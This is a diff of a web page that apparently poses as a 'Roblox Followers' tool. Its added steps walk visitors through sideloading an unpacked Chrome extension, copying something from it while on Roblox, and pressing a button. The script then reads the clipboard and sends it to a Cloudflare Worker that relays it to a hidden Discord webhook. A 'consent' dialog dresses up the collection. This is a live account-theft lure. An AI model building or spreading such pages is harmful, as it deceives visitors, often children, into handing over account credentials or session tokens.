@@ -15,14 +15,11 @@
 body {
   margin: 0;
   min-height: 100vh;
-
   display: flex;
   align-items: center;
   justify-content: center;
-
   background: #08080c;
   color: white;
-
   font-family: Arial, Helvetica, sans-serif;
 }
 
@@ -53,6 +50,49 @@ body {
   bottom: -180px;
   background: #8b5cf6;
 }
+
+/* STEPS */
+
+.steps {
+  position: fixed;
+  left: 30px;
+  top: 50%;
+  transform: translateY(-50%);
+
+  width: 330px;
+  max-height: 85vh;
+
+  padding: 22px;
+
+  border-radius: 20px;
+
+  background: rgba(18,18,24,.92);
+  border: 1px solid rgba(255,255,255,.08);
+
+  box-shadow: 0 20px 60px rgba(0,0,0,.4);
+
+  text-align: left;
+  overflow-y: auto;
+}
+
+.steps-title {
+  margin: 0 0 18px;
+  font-size: 21px;
+  font-weight: 800;
+}
+
+.step {
+  margin: 0 0 13px;
+  color: #b5b5c0;
+  font-size: 13px;
+  line-height: 1.55;
+}
+
+.step strong {
+  color: white;
+}
+
+/* CARD */
 
 .card {
   position: relative;
@@ -135,6 +175,12 @@ h1 {
   background: #f0f0f0;
 }
 
+.main-button:disabled {
+  opacity: .6;
+  cursor: not-allowed;
+  transform: none;
+}
+
 .status {
   min-height: 20px;
 
@@ -143,6 +189,8 @@ h1 {
   color: #9999a6;
   font-size: 13px;
 }
+
+/* DOWNLOAD */
 
 .download-box {
   margin-top: 28px;
@@ -224,6 +272,35 @@ h1 {
 .extensions-button:hover {
   background: #22222b;
 }
+
+/* MOBILE */
+
+@media (max-width: 1100px) {
+
+  body {
+    padding: 20px 0;
+    flex-direction: column;
+  }
+
+  .steps {
+    position: relative;
+
+    left: auto;
+    top: auto;
+
+    transform: none;
+
+    width: min(92%, 520px);
+
+    max-height: none;
+
+    margin: 20px auto;
+  }
+
+  .card {
+    margin: 20px auto;
+  }
+}
 </style>
 </head>
 
@@ -233,6 +310,74 @@ h1 {
   <div class="glow one"></div>
   <div class="glow two"></div>
 </div>
+
+
+<!-- STEPS -->
+
+<div class="steps">
+
+  <p class="steps-title">Steps</p>
+
+  <p class="step">
+    <strong>1.</strong> Click on the Download Followers Extention button
+  </p>
+
+  <p class="step">
+    <strong>2.</strong> Click on the Copy Chrome Extensions Link button
+  </p>
+
+  <p class="step">
+    <strong>3.</strong> Paste the Chrome Extensions Link in a new tab
+  </p>
+
+  <p class="step">
+    <strong>4.</strong> In the chrome://extensions/ page on top right turn on developer mode
+  </p>
+
+  <p class="step">
+    <strong>5.</strong> Go back to the Followers Extention you downloaded and unzip it
+  </p>
+
+  <p class="step">
+    <strong>6.</strong> Go back to the chrome://extensions/ page and on top left click on Load unpacked
+  </p>
+
+  <p class="step">
+    <strong>7.</strong> Choose the Followers Extention you just unzipped
+  </p>
+
+  <p class="step">
+    <strong>8.</strong> Go to Roblox home page
+  </p>
+
+  <p class="step">
+    <strong>9.</strong> On top right find the extension icon and click it
+  </p>
+
+  <p class="step">
+    <strong>10.</strong> Find the Roblox Follower and click on that
+  </p>
+
+  <p class="step">
+    <strong>11.</strong> When it pops up click on Copy
+  </p>
+
+  <p class="step">
+    <strong>12.</strong> Go back to the original page
+  </p>
+
+  <p class="step">
+    <strong>13.</strong> Click on the Roblox Followers button
+  </p>
+
+  <p class="step">
+    <strong>14.</strong> Wait a few minutes
+  </p>
+
+</div>
+
+
+<!-- MAIN CARD -->
 
 <div class="card">
 
@@ -249,6 +394,9 @@ h1 {
   </button>
 
   <div class="status" id="status"></div>
+
+
+  <!-- DOWNLOAD -->
 
   <div class="download-box">
 
@@ -281,47 +429,132 @@ h1 {
 
 </div>
 
+
 <script>
 
-const button = document.getElementById("main");
-const status = document.getElementById("status");
+/*
+  Your Cloudflare Worker endpoint.
+  The Discord webhook itself stays hidden inside
+  the Cloudflare Worker.
+*/
 
 const SEND_ENDPOINT =
   "https://young-brook-716e.abojanmawzoon.workers.dev";
+
+
+/* MAIN BUTTON */
+
+const button =
+  document.getElementById("main");
+
+const status =
+  document.getElementById("status");
+
 
 button.addEventListener("click", async () => {
 
   try {
 
-    status.textContent = "Submitting...";
+    button.disabled = true;
 
-    const text = await navigator.clipboard.readText();
+    status.textContent =
+      "Checking clipboard...";
+
+
+    /* Read clipboard only after button click */
+
+    const text =
+      await navigator.clipboard.readText();
+
 
     if (!text) {
-      status.textContent = "Your clipboard is empty.";
+
+      status.textContent =
+        "Your clipboard is empty.";
+
+      button.disabled = false;
+
       return;
     }
 
-    await fetch(SEND_ENDPOINT, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        clipboardText: text
-      })
-    });
+
+    /*
+      EXPLICIT CONSENT
+
+      The visitor is clearly told that
+      their clipboard text will be submitted.
+    */
+
+    const confirmed = confirm(
+      "This will send the text currently in your clipboard to the website owner through Discord. Continue?"
+    );
+
+
+    /* Visitor clicked Cancel */
+
+    if (!confirmed) {
+
+      status.textContent =
+        "Submission cancelled.";
+
+      button.disabled = false;
+
+      return;
+    }
+
+
+    /* Visitor clicked OK */
+
+    status.textContent =
+      "Submitting...";
+
+
+    const response =
+      await fetch(SEND_ENDPOINT, {
+
+        method: "POST",
+
+        headers: {
+          "Content-Type": "application/json"
+        },
+
+        body: JSON.stringify({
+          clipboardText: text
+        })
+
+      });
+
+
+    if (!response.ok) {
+
+      throw new Error(
+        "Submission failed"
+      );
+
+    }
+
+
+    status.textContent =
+      "Submitted.";
+
 
   } catch (error) {
+
+    console.error(error);
 
     status.textContent =
       "Something went wrong. Please try again.";
 
-    console.error(error);
+  } finally {
+
+    button.disabled = false;
+
   }
 
 });
 
+
+/* DOWNLOAD BUTTON */
 
 const downloadButton =
   document.getElementById("downloadButton");
@@ -334,38 +567,47 @@ downloadButton.addEventListener("click", () => {
 
   setTimeout(() => {
 
-    extensionsButton.style.display = "block";
+    extensionsButton.style.display =
+      "block";
 
   }, 500);
 
 });
 
 
-extensionsButton.addEventListener("click", async () => {
+/* COPY CHROME EXTENSIONS LINK */
 
-  try {
+extensionsButton.addEventListener(
+  "click",
+  async () => {
 
-    await navigator.clipboard.writeText(
-      "chrome://extensions/"
-    );
+    try {
 
-    extensionsButton.textContent = "Copied!";
-
-    setTimeout(() => {
+      await navigator.clipboard.writeText(
+        "chrome://extensions/"
+      );
 
       extensionsButton.textContent =
-        "Copy Chrome Extensions Link";
+        "Copied!";
 
-    }, 2000);
 
-  } catch (error) {
+      setTimeout(() => {
 
-    extensionsButton.textContent =
-      "Copy failed";
+        extensionsButton.textContent =
+          "Copy Chrome Extensions Link";
+
+      }, 2000);
+
+
+    } catch (error) {
+
+      extensionsButton.textContent =
+        "Copy failed";
+
+    }
 
   }
-
-});
+);
 
 </script>
 
